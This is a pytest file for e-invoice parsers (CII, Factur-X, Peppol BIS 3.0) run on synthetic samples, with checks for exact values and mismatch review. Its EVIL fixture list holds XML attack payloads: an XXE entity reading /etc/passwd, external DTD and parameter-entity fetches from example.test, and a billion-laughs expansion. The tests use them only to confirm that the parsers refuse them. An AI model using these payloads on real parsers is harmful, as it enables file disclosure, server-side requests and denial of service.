# SPDX-License-Identifier: AGPL-3.0-only OR LicenseRef-Proofly-Commercial
# Copyright (c) 2026 Proofly Technology
"""UN/CEFACT CII, Factur-X and Peppol BIS Billing 3.0 on the synthetic e-invoice samples.

Every value must come out exactly as the XML states it (``synth.pay.einvoices`` writes
the XML from the ground truth), a DTD, an entity or an external reference must be
refused and never resolved, and a Factur-X PDF whose XML disagrees with its own text
must go to a person.
"""

from __future__ import annotations

import io
import json
from functools import cache
from pathlib import Path
from typing import Any

import pytest

from pairly_core.documents.cii import CiiInvoiceParser
from pairly_core.documents.einvoice import XmlParser
from pairly_core.documents.model import REVIEW_WARNINGS, NormalizedDocument
from pairly_core.documents.pdf import PdfParser
from pairly_core.documents.registry import (
    EInvoiceRegistry,
    ParseError,
    ParseOptions,
    default_registry,
)
from pairly_core.documents.ubl import DATA_KEY, UblInvoiceParser
from pairly_core.guardrails import ScanContext, scan_document
from pairly_core.ingestion import sniff as sn
from synth.pay.dataset import DocSpec, build
from synth.pay.einvoices import EInvoiceSample, render_cii, render_sample, samples
from synth.pay.models import InvoiceTruth
from synth.pay.render import render_pdf

OPTIONS = ParseOptions(ocr_languages="eng")
CII_HEAD = (
    "<rsm:CrossIndustryInvoice "
    "xmlns:rsm='urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100' "
    "xmlns:ram='urn:un:unece:uncefact:data:standard:"
    "ReusableAggregateBusinessInformationEntity:100'>"
)


@cache
def _samples() -> tuple[tuple[EInvoiceSample, DocSpec], ...]:
    return tuple(samples(build()))


def _of(fmt: str) -> list[tuple[EInvoiceSample, DocSpec]]:
    found = [pair for pair in _samples() if pair[0].format == fmt]
    assert found, fmt
    return found


def _parse_xml(tmp_path: Path, data: bytes) -> NormalizedDocument:
    path = tmp_path / "inv.xml"
    path.write_bytes(data)
    return default_registry().get(sn.XML).parse(path, OPTIONS)


def _parse_pdf(tmp_path: Path, data: bytes) -> NormalizedDocument:
    path = tmp_path / "inv.pdf"
    path.write_bytes(data)
    return PdfParser().parse(path, OPTIONS)


def _check_exact(doc: NormalizedDocument, truth: InvoiceTruth) -> dict[str, Any]:
    data: dict[str, Any] = json.loads(doc.metadata[DATA_KEY])
    header = {k: v["value"] for k, v in data["header"].items()}
    expected = {
        "supplier_name": truth.vendor_name,
        "supplier_trn": truth.vendor_trn,
        "buyer_name": truth.buyer_name,
        "buyer_trn": truth.buyer_trn,
        "invoice_number": truth.invoice_number,
        "invoice_date": truth.invoice_date,
        "due_date": truth.due_date,
        "payment_terms": truth.payment_terms,
        "currency": truth.currency,
        "po_number": truth.po_number,
        "subtotal": truth.subtotal,
        "vat_rate": truth.vat_rate,
        "vat_amount": truth.vat_amount,
        "total": truth.total,
    }
    assert {k: header.get(k) for k in expected} == expected
    bank = {k: v["value"] for k, v in data["bank"].items()}
    assert bank == (
        {}
        if truth.bank is None
        else {
            "iban": truth.bank.iban,
            "account_name": truth.bank.account_name,
            "swift": truth.bank.bic,
        }
    )
    assert len(data["lines"]) == len(truth.lines)
    for line, want in zip(data["lines"], truth.lines, strict=True):
        assert line["line_no"] == str(want.line_no)
        assert {k: v["value"] for k, v in line.items() if k != "line_no"} == {
            "description": want.description,
            "quantity": want.quantity,
            "unit_price": want.unit_price,
            "vat_category": want.vat_category,
            "vat_rate": want.vat_rate,
            "line_total": want.line_total,
        }
    text_lines = set(doc.text.split("\n"))
    quotes = [v["quote"] for v in data["header"].values()]
    quotes += [v["quote"] for v in data["bank"].values()]
    quotes += [v["quote"] for line in data["lines"] for k, v in line.items() if k != "line_no"]
    assert all(q in text_lines for q in quotes)
    return data


def test_registered_by_default() -> None:
    parser = default_registry().get(sn.XML)
    assert isinstance(parser, XmlParser)
    assert parser.einvoices.formats == {"ubl-2.1-invoice", "un-cefact-cii"}


def test_the_samples_cover_every_format() -> None:
    counts: dict[str, int] = {}
    for sample, _ in _samples():
        counts[sample.format] = counts.get(sample.format, 0) + 1
    assert counts == {"cii": 3, "factur-x": 3, "peppol-bis3": 2}


def test_every_cii_sample_is_read_exactly(tmp_path: Path) -> None:
    for sample, spec in _of("cii"):
        doc = _parse_xml(tmp_path, render_sample(sample, spec.doc))
        assert doc.metadata["einvoice:format"] == "un-cefact-cii", sample.id
        assert doc.parser.name == "cii"
        data = _check_exact(doc, sample.truth)
        assert data["en16931"] is True
        assert data["type_code"] == "380"
        assert not doc.warning_codes()


def test_every_peppol_bis3_sample_is_read_exactly(tmp_path: Path) -> None:
    for sample, spec in _of("peppol-bis3"):
        doc = _parse_xml(tmp_path, render_sample(sample, spec.doc))
        assert doc.metadata["einvoice:format"] == "ubl-2.1-invoice", sample.id
        data = _check_exact(doc, sample.truth)
        assert data["peppol_bis3"] is True
        assert data["pint_ae"] is False
        # The VAT total in the accounting currency is not the invoice's VAT amount.
        assert sample.tax_currency == "AED"
        assert data["header"]["vat_amount"]["value"] != sample.tax_currency_amount


def test_every_facturx_sample_is_read_from_its_attachment(tmp_path: Path) -> None:
    for sample, spec in _of("factur-x"):
        doc = _parse_pdf(tmp_path, render_sample(sample, spec.doc))
        assert doc.metadata["einvoice:format"] == "un-cefact-cii", sample.id
        assert doc.metadata["einvoice:container"] == "factur-x"
        assert doc.metadata["einvoice:attachment"] == "factur-x.xml"
        _check_exact(doc, sample.truth)
        # The attachment is the expected one: no embedded_files warning, nothing for review.
        assert not set(doc.warning_codes()) & REVIEW_WARNINGS, doc.warning_codes()
        # The PDF's own pages come first; the CII lines are one more page without layout.
        assert doc.pages[-1].width == 0.0
        assert doc.pages[-1].number == len(doc.pages)
        assert doc.metadata["pdf:pages"] == str(len(doc.pages) - 1)
        report = scan_document(doc, context=ScanContext(filename="inv.pdf"))
        assert not report.flagged_findings(), sample.id


def _facturx(pdf: bytes, attachments: dict[str, bytes]) -> bytes:
    from pypdf import PdfReader, PdfWriter

    writer = PdfWriter(clone_from=PdfReader(io.BytesIO(pdf)))
    for name, data in attachments.items():
        writer.add_attachment(name, data)
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def test_facturx_whose_xml_disagrees_with_its_pdf_goes_to_a_person(tmp_path: Path) -> None:
    _, spec = _of("factur-x")[0]
    other = _of("factur-x")[1][1]
    # The picture is one invoice; the attached data is another (number, total, IBAN).
    data = _facturx(render_pdf(spec.doc), {"factur-x.xml": render_cii(other.doc)})
    doc = _parse_pdf(tmp_path, data)
    assert "einvoice_mismatch" in doc.warning_codes()
    assert "einvoice_mismatch" in REVIEW_WARNINGS


def test_facturx_with_another_attachment_keeps_the_warning(tmp_path: Path) -> None:
    _, spec = _of("factur-x")[0]
    data = _facturx(
        render_pdf(spec.doc),
        {"factur-x.xml": render_cii(spec.doc), "readme.txt": b"synthetic"},
    )
    doc = _parse_pdf(tmp_path, data)
    assert "embedded_files" in doc.warning_codes()
    assert doc.metadata["einvoice:format"] == "un-cefact-cii"


EVIL = [
    # External entity (XXE): a local file.
    b"<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>"
    + CII_HEAD.encode()
    + b"<rsm:ExchangedDocument><ram:ID>&x;</ram:ID></rsm:ExchangedDocument>"
    b"</rsm:CrossIndustryInvoice>",
    # External DTD, fetched over the network by a naive parser.
    b"<?xml version='1.0'?><!DOCTYPE r SYSTEM 'http://example.test/x.dtd'>"
    + CII_HEAD.encode()
    + b"</rsm:CrossIndustryInvoice>",
    # Entity expansion (billion laughs, small).
    b"<?xml version='1.0'?><!DOCTYPE r [<!ENTITY a 'aaaaaaaaaa'>"
    b"<!ENTITY b '&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;'><!ENTITY c '&b;&b;&b;&b;&b;&b;&b;&b;'>]>"
    + CII_HEAD.encode()
    + b"<rsm:ExchangedDocument><ram:ID>&c;</ram:ID></rsm:ExchangedDocument>"
    b"</rsm:CrossIndustryInvoice>",
    # Parameter entity with an external reference.
    b"<?xml version='1.0'?><!DOCTYPE r [<!ENTITY % p SYSTEM 'http://example.test/p'>%p;]>"
    + CII_HEAD.encode()
    + b"</rsm:CrossIndustryInvoice>",
]


@pytest.mark.parametrize("data", EVIL)
def test_cii_never_resolves_dtds_or_entities(tmp_path: Path, data: bytes) -> None:
    path = tmp_path / "evil.xml"
    path.write_bytes(data)
    with pytest.raises(ParseError) as exc:
        CiiInvoiceParser().parse(path, OPTIONS)
    assert exc.value.code == "unsafe_xml"
    with pytest.raises(ParseError) as exc:
        XmlParser(EInvoiceRegistry([UblInvoiceParser(), CiiInvoiceParser()])).parse(path, OPTIONS)
    assert exc.value.code == "unsafe_xml"


@pytest.mark.parametrize("data", EVIL)
def test_facturx_with_a_malicious_attachment_is_refused(tmp_path: Path, data: bytes) -> None:
    _, spec = _of("factur-x")[0]
    doc = _parse_pdf(tmp_path, _facturx(render_pdf(spec.doc), {"factur-x.xml": data}))
    assert "unsafe_xml" in doc.warning_codes()
    assert "unsafe_xml" in REVIEW_WARNINGS
    assert "einvoice:format" not in doc.metadata
    assert DATA_KEY not in doc.metadata


def test_cii_credit_note_is_not_an_invoice(tmp_path: Path) -> None:
    path = tmp_path / "credit.xml"
    path.write_bytes(
        (
            "<?xml version='1.0'?>" + CII_HEAD + "<rsm:ExchangedDocument><ram:ID>CN-1</ram:ID>"
            "<ram:TypeCode>381</ram:TypeCode></rsm:ExchangedDocument>"
            "</rsm:CrossIndustryInvoice>"
        ).encode()
    )
    with pytest.raises(ParseError) as exc:
        default_registry().get(sn.XML).parse(path, OPTIONS)
    assert exc.value.code == "unsupported_einvoice_format"


def test_cii_line_cap_sends_the_document_to_review(tmp_path: Path) -> None:
    items = "".join(
        "<ram:IncludedSupplyChainTradeLineItem><ram:SpecifiedTradeProduct><ram:Name>x"
        "</ram:Name></ram:SpecifiedTradeProduct></ram:IncludedSupplyChainTradeLineItem>"
        for _ in range(501)
    )
    doc = _parse_xml(
        tmp_path,
        (
            "<?xml version='1.0'?>" + CII_HEAD + "<rsm:SupplyChainTradeTransaction>"
            f"{items}</rsm:SupplyChainTradeTransaction></rsm:CrossIndustryInvoice>"
        ).encode(),
    )
    assert "lines_truncated" in doc.warning_codes()
